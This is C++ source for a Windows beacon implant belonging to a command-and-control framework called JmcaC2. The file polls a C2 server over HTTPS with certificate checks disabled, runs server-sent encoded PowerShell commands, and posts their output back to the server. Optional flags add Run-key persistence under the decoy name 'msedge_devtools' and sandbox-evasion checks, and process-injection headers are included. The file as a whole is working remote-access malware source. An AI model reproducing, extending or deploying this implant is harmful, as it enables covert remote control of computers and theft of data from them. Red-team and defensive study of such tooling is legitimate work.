// Authors: Hudson and Isaac
// Date: 11/17/2025
// Description: Beacon client for JmcaC2
// Compile: g++ .\main.cpp -lwinhttp -lws2_32 -o beacon-client.exe
// Compile: cl  main.cpp /link ws2_32.lib winhttp.lib user32.lib;

#include "evasion.h"
#include "procInjection.h"
#include "common.h"
#include <vector>

namespace fs = filesystem;

int currentSleep = 10000;
static wstring currentTaskIndex = L"";

const wchar_t *ACCEPTED_MIME_TYPES[] = {
    L"text/plain", L"application/octet-stream", L"text/html",
    L"multipart/form-data", NULL};

string runEncodedPSCommand(string command);
bool sendResults(const string &data, bool asStream = false);

static wstring beaconName = L"";

bool runTask(string outBuffer, DWORD dwSize)
{
#ifdef DEBUG
    printf("Running TASK: %.*s\n", dwSize, outBuffer.c_str());
#endif
    // find the 2 pipe positions to parse the full task
    // taskIndex|command|data

    // find the first pipe
    size_t pipePos = outBuffer.find('|');
    if (pipePos == string::npos)
    {
        return false;
    }
    // store the current task index we are working on so we can send it back with results
    string idx = outBuffer.substr(0, pipePos);
    currentTaskIndex.assign(idx.begin(), idx.end());

    // find the next pipe
    size_t startPos = pipePos + 1;
    pipePos = outBuffer.find('|', startPos);
    if (pipePos == string::npos)
    {
        return false;
    }
    string cmd = outBuffer.substr(startPos, pipePos - startPos);

    if (cmd == "sleep")
    {
        int seconds{};
        try
        {
            seconds = stoi(outBuffer.substr(pipePos + 1));
        }
        catch (const exception &e)
        {
#ifdef DEBUG
            cout
                << "Error: " << e.what() << "\n";
#endif
        }

        currentSleep = seconds * 100000 ? seconds : currentSleep;
    }
    else
    {
        // the client always expects an encoded ps command
        // the command also specifies if it wants the response type to be
        // a stream or a file. We could probably consolidate them
        string encodedPsCmd = outBuffer.substr(pipePos + 1);
        string res = runEncodedPSCommand(encodedPsCmd);
        sendResults(res, cmd == "stream");
    }

    return true;
}

string runEncodedPSCommand(string command)
{
    char psBuffer[DEFAULT_PS_BUFLEN];
    string res;

    string powershellCommand =
        "powershell -NoProfile -NonInteractive -e \"" + command + "\"";

    // read binary in case we want files
    FILE *pPipe = _popen(powershellCommand.c_str(), "rb");

    if (!pPipe)
        return "ERROR";

    size_t bytesRead = 0;
    while ((bytesRead = fread(psBuffer, 1, sizeof(psBuffer), pPipe)) > 0)
    {
        res.append(psBuffer, bytesRead);
    }

    int exitCode = _pclose(pPipe);

    return res;

    // TODO: Make this process injection?
}

bool fetchWinHTTPError(const char *msg)
{
#ifdef DEBUG
    cout << msg << " failed: " << GetLastError() << "\n";
#endif
    return false;
}

bool fetchTasks(char **outBuffer, DWORD *dwSizeOut)
{
    // WinHTTP > WinINet

    /*WinHttpOpen -> WinHttpConnect (example.com) -> WinHttpOpenRequest   ->
    WinHttpSetOption (user-agent/content-type) ->
    WinHttpSendRequest -> WinHttpReadData -> TASK -> Close / cleanup*/

    // https://github.com/MicrosoftDocs/win32/blob/docs/desktop-src/WinHttp/winhttp-sessions-overview.md#using-the-winhttp-api-to-access-the-web

    HINTERNET hHTTPSession = {}, hHTTPConnection = {}, hHTTPRequest = {};
    bool isRequestSuccessful{}, didReceiveResponse{};

    if (!(hHTTPSession = WinHttpOpen(
              L"JmcaC2 Task Fetching", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)))
    {
        return fetchWinHTTPError("WinHttpOpen");
    }

    if (!(hHTTPConnection = WinHttpConnect(hHTTPSession, HTTP_SERVER_IP,
                                           (INTERNET_PORT)HTTP_SERVER_PORT, 0)))
    {
        return fetchWinHTTPError("WinHttpOpen");
    }

    if (!(hHTTPRequest = WinHttpOpenRequest(
              hHTTPConnection, L"GET", L"/", NULL, WINHTTP_NO_REFERER,
              ACCEPTED_MIME_TYPES, WINHTTP_FLAG_SECURE)))
    {
        return fetchWinHTTPError("WinHttpOpenRequest");
    }

#ifdef DEBUG
    cout << "Request Sent" << endl;
#endif

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

    if (!WinHttpSetOption(hHTTPRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags,
                          sizeof(flags)))
    {
        return fetchWinHTTPError("WinHttpSetOption");
    }

    wstring headerString;
    LPCWSTR headerPtr = WINHTTP_NO_ADDITIONAL_HEADERS;

    if (!beaconName.empty())
    {
        headerString = L"Beacon-Name: " + beaconName + L"\r\n";
        headerPtr = headerString.c_str();
    }

    // should be replaced if POST
    if (!(isRequestSuccessful =
              WinHttpSendRequest(hHTTPRequest, headerPtr, (DWORD)-1,
                                 WINHTTP_NO_REQUEST_DATA, 0, 0, 0)))
    {
        return fetchWinHTTPError("WinHttpSendRequest");
    }

    if (!(didReceiveResponse = WinHttpReceiveResponse(hHTTPRequest, NULL)))
    {
        return fetchWinHTTPError("WinHttpReceiveResponse");
    }

    // extract the beacon name from the response
    if (beaconName.empty())
    {
        DWORD size = 0;
        WinHttpQueryHeaders(hHTTPRequest, WINHTTP_QUERY_CUSTOM, L"Beacon-Name",
                            WINHTTP_NO_OUTPUT_BUFFER, &size,
                            WINHTTP_NO_HEADER_INDEX);

        // If size is 0, the header isn't present.
        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
        {
            wstring buffer(size / sizeof(wchar_t),
                           L'\0'); // allocate correct size

            if (WinHttpQueryHeaders(hHTTPRequest, WINHTTP_QUERY_CUSTOM,
                                    L"Beacon-Name", &buffer[0], &size,
                                    WINHTTP_NO_HEADER_INDEX))
            {
                buffer.resize(
                    (size / sizeof(wchar_t))); // remove terminating null
                // wprintf(L"Header value: %s\n", buffer.c_str());
                beaconName = buffer;
            }
        }
    }

    DWORD dwSize = 0;

    while (true)
    {
        if (!WinHttpQueryDataAvailable(hHTTPRequest, &dwSize) || !dwSize)
            break;
        char *responseBuf = new char[dwSize + 1];
        ZeroMemory(responseBuf, dwSize + 1);

        DWORD dwOut = 0;

        if (!WinHttpReadData(hHTTPRequest, responseBuf, dwSize, &dwOut))
        {
            delete[] responseBuf;
            break;
        }

        // append chunk to output
        char *newBuf = new char[*dwSizeOut + dwOut];

        if (*outBuffer != nullptr)
        {
            memcpy(newBuf, *outBuffer, *dwSizeOut);
            delete[] (*outBuffer);
        }

        memcpy(newBuf + *dwSizeOut, responseBuf, dwOut);

        *dwSizeOut += dwOut;
        newBuf[*dwSizeOut] = '\0';
        *outBuffer = newBuf;
        delete[] responseBuf;
    }

    if (hHTTPRequest)
        WinHttpCloseHandle(hHTTPRequest);
    if (hHTTPConnection)
        WinHttpCloseHandle(hHTTPConnection);
    if (hHTTPSession)
        WinHttpCloseHandle(hHTTPSession);

    return didReceiveResponse;
}

bool sendResults(const string &result, bool asStream)
{

    HINTERNET hHTTPSession = {}, hHTTPConnection = {}, hHTTPRequest = {};
    bool isRequestSuccessful{}, didReceiveResponse{};

    if (!(hHTTPSession = WinHttpOpen(
              L"JmcaC2 Task Results", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)))
    {
        return fetchWinHTTPError("WinHttpOpen");
    }

    if (!(hHTTPConnection = WinHttpConnect(hHTTPSession, HTTP_SERVER_IP,
                                           (INTERNET_PORT)HTTP_SERVER_PORT, 0)))
    {

        return fetchWinHTTPError("WinHttpOpen");
    }

    // different paths based on
    wstring path = L"/";
    if (!asStream)
    {
        path = L"/upload";
    }

    if (!(hHTTPRequest = WinHttpOpenRequest(
              hHTTPConnection, L"POST", path.c_str(), NULL, WINHTTP_NO_REFERER,
              ACCEPTED_MIME_TYPES, WINHTTP_FLAG_SECURE)))
    {
        return fetchWinHTTPError("WinHttpOpenRequest");
    }
#ifdef DEBUG
    cout << "Request Sent" << endl;
#endif
    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

    if (!WinHttpSetOption(hHTTPRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags,
                          sizeof(flags)))
    {
        return fetchWinHTTPError("WinHttpSetOption");
    }

    if (asStream)
    {
        wstring headers = L"Content-Type: multipart/form-data\r\n";

        headers += L"Beacon-Name: " + beaconName + L"\r\n";
        headers += L"Task-Index: " + currentTaskIndex + L"\r\n";

        // should be replaced if POST
        if (!(isRequestSuccessful = WinHttpSendRequest(
                  hHTTPRequest, headers.c_str(), (DWORD)-1, (LPVOID)result.data(),
                  (DWORD)result.size(), (DWORD)result.size(), 0)))
        {
            return fetchWinHTTPError("WinHttpSendRequest");
        }
    }
    else
    {
        uintmax_t fileSize = result.size();
        // Build headers
        wstring headerStr = L"Beacon-Name: " + beaconName + L"\r\n" +
                            L"Task-Index: " + currentTaskIndex + L"\r\n" +
                            L"File-Name: " + L"Task_" + currentTaskIndex + L"_Results" + L"\r\n" +
                            L"File-Length: " + to_wstring(fileSize) + L"\r\n" +
                            L"Content-Type: application/octet-stream\r\n" +
                            L"Content-Length: " + to_wstring(fileSize) + L"\r\n";

        // Send request with no body yet
        if (!WinHttpSendRequest(hHTTPRequest, headerStr.c_str(), (DWORD)-1,
                                WINHTTP_NO_REQUEST_DATA, 0, (DWORD)fileSize, 0))
        {
            return fetchWinHTTPError("WinHttpSendRequest");
        }

        // Write raw file bytes
        DWORD bytesWritten = 0;
        if (!WinHttpWriteData(hHTTPRequest, result.data(), (DWORD)fileSize,
                              &bytesWritten))
        {
            return fetchWinHTTPError("WinHttpWriteData");
        }
    }

    // Receive server response
    if (!WinHttpReceiveResponse(hHTTPRequest, nullptr))
    {
        return fetchWinHTTPError("WinHttpReceiveResponse");
    }

    // Cleanup
    if (hHTTPRequest)
    {
        WinHttpCloseHandle(hHTTPRequest);
    }
    if (hHTTPConnection)
    {
        WinHttpCloseHandle(hHTTPConnection);
    }
    if (hHTTPSession)
    {
        WinHttpCloseHandle(hHTTPSession);
    }

    return true;
}

void estPersistence()
{
    // Source - https://stackoverflow.com/a
    // Posted by mxcl, modified by community. See post 'Timeline' for change history
    // Retrieved 2025-12-03, License - CC BY-SA 3.0

    char pBuf[256];
    size_t len = sizeof(pBuf);

    // first param is NULL so it retreives the
    // executable path for the current process: MS docs
    int bytes = GetModuleFileNameA(NULL, pBuf, len);

    HKEY hkey = NULL;
    RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
    // pBuf must be null terminated: MS docs for RegSetValueExA
    // cbdata must include null terminator: MS docs
    RegSetValueExA(hkey, "msedge_devtools", 0, REG_SZ, (BYTE *)pBuf, bytes + 1);
}

int main(int argc, const char **argv)
{
// Establish Persistence
// enable during build with -DPERSIST
#ifdef PERSIST
    estPersistence();
#endif

// enable during build with -DEVASION_CHECKS
#ifdef EVASION_CHECKS
    // Run all checks
    BOOL cpuOK = checkCPU();
    BOOL ramOK = checkRAM();
    BOOL hddOK = checkHDD();
    BOOL processesOK = checkProcesses();

    // Check if all tests passed 
    if (!cpuOK || !ramOK || !hddOK || !processesOK)
    {
        return 0;
    }
#endif

    char *outBuffer = nullptr;
    DWORD dwSize = 0;

    while (true)
    {
        if (fetchTasks(&outBuffer, &dwSize))
        {
            // TODO: parse tasks and do
            if (dwSize > 0)
            {
                runTask(outBuffer, dwSize);
                delete[] outBuffer;
                outBuffer = nullptr;
                dwSize = 0;
            }
            // processInject();
            // runPSCommand(argv[1]);
            //  TODO: post results
        }

        Sleep(currentSleep);
    }

    return 0;
}